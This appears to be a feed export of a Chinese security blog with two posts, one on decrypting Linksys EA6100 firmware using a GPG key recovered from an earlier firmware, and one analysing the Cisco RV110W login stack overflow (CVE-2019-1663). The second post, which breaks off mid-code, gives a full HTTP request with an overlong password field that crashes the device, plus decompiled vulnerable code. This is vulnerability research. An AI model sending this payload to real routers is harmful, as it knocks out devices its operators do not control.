    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>这一次来分享一个对固件解密的文章<br>在一次分析固件的过程中，看到了Linksys EA6100 的一款固件，很不幸，这款固件被加密了，这里接下来将固件解密的过程来做个梳理。</p><h2 id="0x02-固件信息"><a href="#0x02-固件信息" class="headerlink" title="0x02 固件信息"></a>0x02 固件信息</h2><p>首先在固件的下载界面查看固件的版本，这里有两个版本，先不管那么多，全都下载下来，拿到固件 “ FW_EA6100_1.1.6.181939_prod.gpg.img “ ，我看到固件名字，感觉很奇怪，第一次到固件以 “ .gpg.img” 为结尾的固件包，正常的固件包是以 “img”、“bin”、“chk” 为结尾。bing 搜索，发现只能搜到gpg的的相关信息，在了解完了gpg信息后，知道了这是一个为文件生成签名、管理密钥以及验证签名的工具。因此固件很有可能是使用GPG生成的密钥进行加密的。</p><p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210707214022160.png" alt="image-20210707214022160"></p><h2 id="0x03-判断是否被加密"><a href="#0x03-判断是否被加密" class="headerlink" title="0x03 判断是否被加密"></a>0x03 判断是否被加密</h2><p>这里介绍以下判断固件是否加密的一种方式。<br>我们使用的是binwalk来分析<br>根据binwalk的熵分析，可以看到固件处于加密的状态。</p><blockquote><p>熵是用于表达混乱程度的名词，熵值可以表达系统中蕴含的能量，也可用于表达信息中的不确定性。</p></blockquote><p>根据下面的图形可以了解到，“ FW_EA6100_1.1.6.181939_prod.gpg.img ” 固件的熵值几乎为1，属于高熵，说明固件处于被加密的状态。</p><p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210707215634961.png" alt="image-20210707215634961"></p><p>如下图所示，这是一个没有加密的NetGear WiFi拓展器的固件，可以看到熵值有剧烈的上下波动，说明这部分的固件并没有被加密。</p><p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210707220314465.png" alt="image-20210707220314465"></p><h3 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h3><p>使用binwalk 看一下固件的信息，因为固件被加密了，所以啥都看不到。</p><p>同时也file识别不出来</p><p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210707225553391.png" alt="image-20210707225553391"></p><p>当我不知道下一步应该怎么做的时候，发现了下载固件页面中有这么一段话。</p><blockquote><p><strong>IMPORTANT:</strong>  It is <strong>highly recommended</strong> to upgrade the firmware of your router using the <strong>Auto Update</strong> feature.  However, if you prefer to do manual updates and your router is on <strong>1.1.5.162431 or older, YOU MUST download &amp; update your router using firmware version 1.1.5.172244 first before loading the latest firmware</strong>.</p></blockquote><p>在更新最新固件的时候，需要先下载 Ver. 1.1.5 (Build 172244) 作为中间件，来升级到最新的固件，这个设备的最新固件就是Ver. 1.1.6，但是这个固件是加密的，一般来说，需要中间件的情况是用于提供密钥来解密最新的固件，并且FW_EA6100_1.1.5.172244_prod.img 中是没有 “gpg” 后缀的，说明这个固件并没有被加密，这样一来就说的通了。</p><p>根据实际的分析情况来看，这个固件确实没有被加密，可以识别出来文件系统是用 jffs2 压缩方式进行压缩的。</p><p>查看固件的组成结构</p><p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210707225219915.png" alt="image-20210707225219915"></p><p>计算固件熵值</p><p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210707225448879.png" alt="image-20210707225448879"></p><p>file 查看</p><p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210707225532197.png" alt="image-20210707225532197"></p><p>接下来我们直接使用 binwlk -Me 来提取固件jffs2-root 文件系统。</p><p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210707230420894.png" alt="image-20210707230420894"></p><p>我们将 Ver. 1.1.5 (Build 172244) 的固件成功解开了，在这里，我们先了解一下gpg 生成密钥的形式是什么样的。</p><p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210707231205509.png" alt="image-20210707231205509"></p><p>然后我就在固件中包含pub 、rsa 字符串的文件，很不幸，一无所获，找到的都是一些无关的文件。<br>于是我开始检索一些其他的密钥保存的格式之后，一般都是下面的这种方式</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-params">-----BEGIN</span> RSA PRIVATE KEY<span class="hljs-params">-----</span>  <span class="hljs-comment"># 私钥内容</span><br><span class="hljs-string">...</span> <span class="hljs-params">(private key in base64 encoding)</span> <span class="hljs-string">...</span><br><span class="hljs-params">-----END</span> RSA PRIVATE KEY<span class="hljs-params">-----</span><br><span class="hljs-params">-----BEGIN</span> CERTIFICATE<span class="hljs-params">-----</span>  <span class="hljs-comment"># 证书信息</span><br><span class="hljs-string">...</span> <span class="hljs-params">(certificate in base64 PEM encoding)</span> <span class="hljs-string">...</span><br><span class="hljs-params">-----END</span> CERTIFICATE<span class="hljs-params">-----</span><br></code></pre></td></tr></table></figure><p>于是顺着这个思路，我终于找到了类似 gpg 密钥的文件了，幸运的 “ keydata ” 文件</p><p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210708153712590.png" alt="image-20210708153712590"></p><p>首先将keydata 加载到 系统中的 gpg 中，然后再进行对固件包解密</p><p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210708155023874.png" alt="image-20210708155023874"></p><p>我们成功的得到了解密后的文件，使用binwalk 识别一下固件的信息。</p><p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210708155516962.png" alt="image-20210708155516962"></p><p>现在用binwalk 就可以完全的解开固件包了</p><p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210708160302575.png" alt="image-20210708160302575"></p><h2 id="0x05总结"><a href="#0x05总结" class="headerlink" title="0x05总结"></a>0x05总结</h2><p>本片文章主要是讲解对固件如何解密的一种方法，这种固件就是以前的固件没有加密，但是后面的固件加密了，在需要解密的情况下，就需要一个中间过渡版本的固件，这个过渡版本的固件中带有解密程序，然后对最新的固件进行解密。</p><p>这里还对固件的文件系统进行了简单的分析，虽然没有发现显著的漏洞，但是这里也简单描述一下。<br>在&#x2F;etc&#x2F;init.d&#x2F;service_httpd.sh 文件中了解到了lighttpd是设备web组件，以及web组件启动的过程。<br>lighttpd 文件是在&#x2F;usr&#x2F;sbin&#x2F;中<br>&#x2F;etc&#x2F;init.d&#x2F;中包含了设备启动初始化所有的启动文件，并且包含一些密钥信息。<br>&#x2F;www&#x2F;ui&#x2F;cgi&#x2F; 文件夹中有一些cgi 文件，但是经过分析，并没有发现有异常的风险点。<br>&#x2F;www&#x2F;ui&#x2F;local 文件夹中主要包含的是路由器设备的前端的html一些文件。<br>逆向分析了一下lighttpd，并没有发现一些风险点，可能是对lighttpd 框架了解的不多，等拜读一下源码，了解那里是二次开发的地方，再来分析这个组件。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Cisco_RV110W_堆栈缓冲区溢出漏洞分析和利用</title>
    <link href="/2023/12/15/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2023/12/15/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="Cisco-RV110W-堆栈缓冲区溢出漏洞分析"><a href="#Cisco-RV110W-堆栈缓冲区溢出漏洞分析" class="headerlink" title="Cisco_RV110W_堆栈缓冲区溢出漏洞分析"></a>Cisco_RV110W_堆栈缓冲区溢出漏洞分析</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p> 本篇文章是针对Cisco RV110W 设备的一次栈溢出漏洞分析与复现。</p><p>漏洞通告：<a href="https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-20190227-rmi-cmd-ex.html">https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-20190227-rmi-cmd-ex.html</a></p><h2 id="0x02-漏洞触发"><a href="#0x02-漏洞触发" class="headerlink" title="0x02 漏洞触发"></a>0x02 漏洞触发</h2><p>漏洞编号：CVE-2019-1663</p><p>漏洞固件版本：Cisco RV110W&lt;1.2.2.1</p><p>UART 串口接入设备shell，查看设备的端口开放情况，并且cisco的web服务是可以访问，开启了443端口</p><p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20221115152433365.png" alt="image-20221115152433365"></p><p>登录，pwd的值使用MD5 将密码进行加密</p><p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210726141729042.png" alt="image-20210726141729042"></p><p>将payloads 更改为，并且发送请求的payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login.cgi</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>556<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;92&quot;, &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;92&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://192.168.1.1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://192.168.1.1/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>XSRF_TOKEN=1222440606; mlap=RGVmYXVsdDM6Ojo6Y2lzY28=<br><br><span class="language-dts">submit_<span class="hljs-attr">button</span><span class="hljs-operator">=</span>login<span class="hljs-variable">&amp;submit_type</span>=<span class="hljs-variable">&amp;gui_action</span>=<span class="hljs-variable">&amp;wait_time</span>=<span class="hljs-number">0</span><span class="hljs-variable">&amp;change_action</span>=<span class="hljs-variable">&amp;enc</span>=<span class="hljs-number">1</span><span class="hljs-variable">&amp;user</span>=cisco+<span class="hljs-variable">&amp;pwd</span>=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZZZZ<span class="hljs-variable">&amp;sel_lang</span>=EN</span><br></code></pre></td></tr></table></figure><p>现在我们再次来看设备的web 443服务，可以很明显的看到设备的端口已经down 了。并且设备的web 的服务也无法访问。初步判断在登录的pwd 值处发生了堆栈的缓冲区溢出的漏洞。</p><p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210726141951659.png" alt="image-20210726141951659"></p><h2 id="0x02-固件分析"><a href="#0x02-固件分析" class="headerlink" title="0x02 固件分析"></a>0x02 固件分析</h2><p>由于思科的固件都是公开的，因此可以直接从思科的support站上下载固件，接着使用binwalk 解开固件包，固件使用的是Squashfs 最常见的嵌入式文件系统格式。</p><p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20221115152840681.png" alt="image-20221115152840681"></p><p>通过固件内的二进制文件获取获取指令架构的相关信息，固件为mips 32位小端的指令架构。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">shayuhuajiao@ubuntu ~/i/g/_/squashfs-root&gt; file sbin/rc<br>sbin/rc: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped<br>shayuhuajiao@ubuntu ~/i/g/_/squashfs-root&gt; file bin/busybox <br>bin/busybox: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped<br></code></pre></td></tr></table></figure><p>根据披露的漏洞信息和漏洞触发行为，漏洞产生在http 服务上，因此可以很快的定位提供http服务的 httpd 二进制文件，该文件在  &#x2F;usr&#x2F;sbin&#x2F;httpd  中</p><p>使用ghidra 导入httpd</p><p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20221115155911402.png" alt="image-20221115155911402"></p><p><strong>漏洞点的流程</strong></p><p>log_in_cgi() –&gt; login_check() —&gt; valid_user()</p><p>漏洞函数是在vailid_user(char *pcParm1,char *pcParm2,char *pcParm3,int iParm4)函数，parm1 和 parm2 分别是输入的user 和password 的值，另外parm4 是enc的值。漏洞函数的传参下面会分析，这个函数中具体的漏洞点如下，首先程序会判断enc的值是否是1 ，如果不是，那就对比”enc&#x3D;” 字符串，一般来说都能触发 strcpy 函数。strcpy 函数会将pcParm2 的值复制到acStack109中，并且没有对pcParm2的长度没有限制，因此会造成acStack109[69] 的内存单元无法容纳大长度的字节，从而造成缓冲区溢出的漏洞。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">valid_user</span><span class="hljs-params">(<span class="hljs-type">char</span> *pcParm1,<span class="hljs-type">char</span> *pcParm2,<span class="hljs-type">char</span> *pcParm3,<span class="hljs-type">int</span> iParm4)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">bool</span> bVar1;<br>  <span class="hljs-type">int</span> iVar2;<br>  <span class="hljs-type">size_t</span> sVar3;<br>  <span class="hljs-type">size_t</span> sVar4;<br>  <span class="hljs-type">int</span> iVar5;<br>  <span class="hljs-type">long</span> lVar6;<br>  undefined4 uVar7;<br>  <span class="hljs-type">char</span> *__s1;<br>  <span class="hljs-type">char</span> *__s1_00;<br>  undefined4 local_108;<br>  undefined4 local_104;<br>  undefined2 local_100;<br>  <span class="hljs-type">char</span> acStack254 [<span class="hljs-number">40</span>];<br>  <span class="hljs-type">char</span> acStack214 [<span class="hljs-number">40</span>];<br>  <span class="hljs-type">char</span> acStack174 [<span class="hljs-number">65</span>];<br>  <span class="hljs-type">char</span> acStack109 [<span class="hljs-number">69</span>];<br>  <br>  <span class="hljs-built_in">memset</span>(acStack254,<span class="hljs-number">0</span>,<span class="hljs-number">0x28</span>);<br>  <span class="hljs-built_in">memset</span>(acStack214,<span class="hljs-number">0</span>,<span class="hljs-number">0x28</span>);<br>  <span class="hljs-built_in">memset</span>(acStack174,<span class="hljs-number">0</span>,<span class="hljs-number">0x41</span>);<br>  local_108 = <span class="hljs-number">0</span>;<br>  local_104 = <span class="hljs-number">0</span>;<br>  local_100 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">memset</span>(acStack109,<span class="hljs-number">0</span>,<span class="hljs-number">0x41</span>);  <span class="hljs-comment">// 初始化acStack109</span><br>  <span class="hljs-built_in">sscanf</span>(pcParm3,<span class="hljs-string">&quot;%[^,],%[^,],%[^\n]&quot;</span>,&amp;local_108,acStack214,acStack254);<br>  <span class="hljs-keyword">if</span> (iParm4 == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//iParm4 是enc=的值</span><br>    iVar2 = <span class="hljs-built_in">strncmp</span>(acStack214,<span class="hljs-string">&quot;enc=&quot;</span>,<span class="hljs-number">4</span>);<br>    <span class="hljs-keyword">if</span> (iVar2 == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-built_in">md5_encode</span>(pcParm2,acStack109);<br>      <span class="hljs-built_in">sscanf</span>(acStack214,<span class="hljs-string">&quot;enc=%s&quot;</span>,acStack174);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">strcpy</span>(acStack174,acStack214);<br>      <span class="hljs-built_in">strcpy</span>(acStack109,pcParm2);<span class="hljs-comment">//漏洞点获取的pwd参数使用strcpy 到asStack109，没有对长度进行限制，进而产生溢出</span><br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    iVar2 = <span class="hljs-built_in">strncmp</span>(acStack214,<span class="hljs-string">&quot;enc=&quot;</span>,<span class="hljs-number">4</span>);<br>    <span class="hljs-keyword">if</span> (iVar2 == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-built_in">sscanf</span>(acStack214,<span class="hljs-string">&quot;enc=%s&quot;</span>,acStack174);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">md5_encode</span>(acStack214,acStack174);<br>    &#125;<br>    <span class="hljs-built_in">strcpy</span>(acStack109,pcParm2); <span class="hljs-comment">//漏洞点获取的pwd参数使用strcpy 到asStack109，没有对长度进行限制，进而产生溢出</span><br>  &#125;<br>  sVar3 = <span class="hljs-built_in">strlen</span>(acStack254);<br>  sVar4 = <span class="hljs-built_in">strlen</span>(pcParm1);<br>  <span class="hljs-keyword">if</span> (sVar3 == sVar4) &#123;<br>    sVar3 = <span class="hljs-built_in">strlen</span>(acStack174);<br>    sVar4 = <span class="hljs-built_in">strlen</span>(acStack109);<br>    iVar2 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (sVar3 == sVar4) &#123;<br>      iVar5 = <span class="hljs-built_in">strcmp</span>(acStack254,pcParm1);<br>      iVar2 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> (iVar5 == <span class="hljs-number">0</span>) &#123;<br>        iVar5 = <span class="hljs-built_in">strcmp</span>(acStack174,acStack109);<br>        iVar2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (iVar5 == <span class="hljs-number">0</span>) &#123;<br>          __s1_00 = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">nvram_get</span>(<span class="hljs-string">&quot;en_guest&quot;</span>);<br>          iVar2 = <span class="hljs-number">1</span>;<br>          <span class="hljs-keyword">if</span> (__s1_00 != (<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>) &#123;<br>            iVar5 = <span class="hljs-built_in">strcmp</span>(__s1_00,<span class="hljs-string">&quot;0&quot;</span>);<br>            iVar2 = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (iVar5 == <span class="hljs-number">0</span>) &#123;<br>              __s1_00 = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">nvram_get</span>(<span class="hljs-string">&quot;http_power&quot;</span>);<br>              iVar2 = <span class="hljs-number">1</span>;<br>              <span class="hljs-keyword">if</span> (__s1_00 != (<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>) &#123;<br>                iVar5 = <span class="hljs-built_in">strcmp</span>(__s1_00,<span class="hljs-string">&quot;r&quot;</span>);<br>                iVar2 = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">if</span> (iVar5 == <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> LAB_00431a9c;<br>              &#125;<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>LAB_00431a9c:<br>    iVar2 = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (do_onplus != <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> iVar2;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (iVar2 == <span class="hljs-number">0</span>) &#123;<br>    iVar2 = <span class="hljs-built_in">nvram_get</span>(<span class="hljs-string">&quot;http_client_ip&quot;</span>);<br>    <span class="hljs-keyword">if</span> (iVar2 == <span class="hljs-number">0</span>) &#123;<br>      iVar2 = <span class="hljs-number">0x487990</span>;<br>    &#125;<br>    <span class="hljs-built_in">syslog</span>(<span class="hljs-number">6</span>,<span class="hljs-string">&quot;Invalid username or password from %s.&quot;</span>,iVar2);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  iVar2 = <span class="hljs-built_in">sys_uptime</span>();<br>  __s1_00 = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">nvram_get</span>(<span class="hljs-string">&quot;auth_time&quot;</span>);<br>  <span class="hljs-keyword">if</span> (__s1_00 == (<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>) &#123;<br>    __s1_00 = <span class="hljs-string">&quot;&quot;</span>;<br>  &#125;<br>  __s1 = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">nvram_get</span>(<span class="hljs-string">&quot;http_power&quot;</span>);<br>  <span class="hljs-keyword">if</span> ((__s1 == (<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>) || (iVar5 = <span class="hljs-built_in">strcmp</span>(__s1,<span class="hljs-string">&quot;rw&quot;</span>), iVar5 != <span class="hljs-number">0</span>)) &#123;<br>    iVar5 = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    __s1 = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">nvram_get</span>(<span class="hljs-string">&quot;admin_timeout&quot;</span>);<br>    <span class="hljs-keyword">if</span> (__s1 == (<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>) &#123;<br>      __s1 = <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>    iVar5 = <span class="hljs-built_in">atoi</span>(__s1);<br>    <span class="hljs-keyword">if</span> (iVar5 == <span class="hljs-number">99</span>) &#123;<br>      bVar1 = <span class="hljs-literal">false</span>;<br>      <span class="hljs-keyword">goto</span> LAB_00431d18;<br>    &#125;<br>    iVar5 = iVar5 * <span class="hljs-number">0x3c</span>;<br>  &#125;<br>  lVar6 = <span class="hljs-built_in">atol</span>(__s1_00);<br>  <span class="hljs-keyword">if</span> ((iVar2 &lt; lVar6) || (bVar1 = <span class="hljs-literal">false</span>, iVar5 &lt;= iVar2 - lVar6)) &#123;<br>    <span class="hljs-built_in">syslog</span>(<span class="hljs-number">6</span>,<span class="hljs-string">&quot;Administrator session timeout.&quot;</span>);<br>    bVar1 = <span 